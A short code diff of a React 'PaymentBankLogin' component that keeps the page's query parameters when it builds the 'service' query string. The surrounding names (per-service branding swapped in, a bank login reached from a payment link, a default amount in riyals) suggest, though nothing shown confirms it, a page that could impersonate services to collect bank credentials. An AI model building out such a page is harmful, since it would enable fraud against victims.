@@ -19,6 +19,7 @@ const PaymentBankLogin = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData, isLoading } = useLink(id);
+  const initialSearch = useMemo(() => (typeof window !== "undefined" ? window.location.search : ""), []);
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -68,7 +69,14 @@ const PaymentBankLogin = () => {
   const branding = getServiceBranding(serviceKey);
   const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
-  const serviceQuery = serviceKey ? `?service=${encodeURIComponent(serviceKey)}` : "";
+  const serviceQuery = useMemo(() => {
+    const params = new URLSearchParams(initialSearch || "");
+    if (serviceKey) {
+      params.set('service', serviceKey);
+    }
+    const search = params.toString();
+    return search ? `?${search}` : "";
+  }, [initialSearch, serviceKey]);
 
   useEffect(() => {
     if (serviceKey) {
